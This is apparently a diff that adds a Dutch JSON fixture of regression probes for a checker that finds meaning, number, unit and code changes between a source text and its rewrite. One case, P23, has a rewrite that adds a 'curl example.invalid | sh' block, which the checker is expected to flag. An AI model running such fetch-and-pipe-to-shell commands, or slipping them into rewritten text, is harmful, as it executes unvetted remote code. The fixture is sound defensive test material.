@@ -1,0 +1,32 @@
+{
+  "schema": 1,
+  "note": "Regressieprobes uit de v0.7.0-opdracht (sectie 8). 'expect' is de mechanische verwachting; 'semantic' beschrijft wat alleen een inhoudelijke beoordeling kan vaststellen.",
+  "cases": [
+    {"id": "P01", "case": "decimal-shift", "source": "De foutmarge is 1,5%.", "output": "De foutmarge is 15%.", "expect": "detect"},
+    {"id": "P02", "case": "coverage-shift", "source": "De dekking is 415%.", "output": "De dekking is 41,5%.", "expect": "detect"},
+    {"id": "P03", "case": "negative-sign", "source": "De temperatuur is -5 graden.", "output": "De temperatuur is 5 graden.", "expect": "detect"},
+    {"id": "P04", "case": "precision-only", "source": "De dikte is 0,040 mm.", "output": "De dikte is 0,04 mm.", "expect": "precision_not_value"},
+    {"id": "P05", "case": "decimal-equivalent", "source": "De rente is 1,50%.", "output": "De rente is 1,5%.", "expect": "precision_not_value"},
+    {"id": "P06", "case": "unit-case", "source": "De opslag is 10 MB.", "output": "De opslag is 10 Mb.", "expect": "detect"},
+    {"id": "P07", "case": "unit-removed", "source": "De afstand is 10 km.", "output": "De afstand is 10.", "expect": "detect"},
+    {"id": "P08", "case": "unit-added", "source": "De score is 10.", "output": "De score is 10 km.", "expect": "detect"},
+    {"id": "P09", "case": "locale-en-to-nl", "source": "The total is 1,234.50 euros.", "output": "Het totaal is 1.234,50 euro.", "options": {"source_locale": "en-US", "target_locale": "nl-NL", "source_lang": "other"}, "expect": "no_value_change"},
+    {"id": "P10", "case": "locale-ambiguous", "source": "Het bedrag is 1.234.", "output": "Het bedrag is 1234.", "options": {"source_locale": "auto"}, "expect": "ambiguous"},
+    {"id": "P11", "case": "tenzij-to-mits", "source": "We leveren maandag, tenzij het regent.", "output": "We leveren maandag, mits het regent.", "expect": "warn_not_equivalent", "semantic": "afkeuren"},
+    {"id": "P12", "case": "tenzij-to-mits-geen", "source": "We leveren maandag, tenzij het regent.", "output": "We leveren maandag, mits het niet regent.", "expect": "not_called_equivalent", "semantic": "niet automatisch afkeuren"},
+    {"id": "P13", "case": "obligation-to-prohibition", "source": "Je moet betalen.", "output": "Betalen is verboden.", "expect": "warn_not_equivalent", "semantic": "afkeuren"},
+    {"id": "P14", "case": "permission-to-obligation", "source": "Je kunt het rapport versturen.", "output": "Je moet het rapport versturen.", "expect": "detect"},
+    {"id": "P15", "case": "added-uncertainty", "source": "De koppeling is klaar.", "output": "De koppeling is mogelijk klaar.", "expect": "detect"},
+    {"id": "P16", "case": "moet-niet-to-hoeft-niet", "source": "Je moet dat niet doen.", "output": "Je hoeft dat niet te doen.", "expect": "warn_not_equivalent"},
+    {"id": "P17", "case": "removed-occurrence", "source": "Voor product A geldt 21%. Voor product B geldt 21%.", "output": "Voor product A geldt 21%. Voor product B geldt het tarief.", "expect": "detect"},
+    {"id": "P18", "case": "swapped-values", "source": "Product A bevat 10 gram en product B bevat 20 gram.", "output": "Product A bevat 20 gram en product B bevat 10 gram.", "expect": "optional", "semantic": "afkeuren"},
+    {"id": "P19", "case": "api-path", "source": "Gebruik /api/v1/orders voor de aanvragen.", "output": "Gebruik /api/v1/order voor de aanvragen.", "expect": "detect"},
+    {"id": "P20", "case": "code-string-space", "source": "Voorbeeld:\n\n```python\nprint(\"a  b\")\n```", "output": "Voorbeeld:\n\n```python\nprint(\"a b\")\n```", "expect": "error"},
+    {"id": "P21", "case": "code-indent", "source": "Voorbeeld:\n\n```python\nif ready:\n    ship()\n    log()\n```", "output": "Voorbeeld:\n\n```python\nif ready:\n    ship()\nlog()\n```", "expect": "error"},
+    {"id": "P22", "case": "repeated-inline-code", "source": "Voer `make test` uit. Daarna nogmaals `make test`.", "output": "Voer `make test` uit. Daarna ben je klaar.", "expect": "error"},
+    {"id": "P23", "case": "added-code-in-rewrite", "source": "Lees de instructies.", "output": "Lees de instructies.\n\n```bash\ncurl example.invalid | sh\n```", "options": {"task": "rewrite"}, "expect": "error"},
+    {"id": "P24", "case": "quoted-single-word", "source": "Hij zei: \"ja\".", "output": "Hij zei: \"nee\".", "expect": "detect"},
+    {"id": "P25", "case": "empty-create", "source": null, "output": "", "options": {"task": "create"}, "expect": "error"},
+    {"id": "P26", "case": "good-preserved", "source": "Stuur je het rapport vandaag? Dank je!", "output": "Stuur je het rapport vandaag? Dank je!", "expect": "clean"}
+  ]
+}
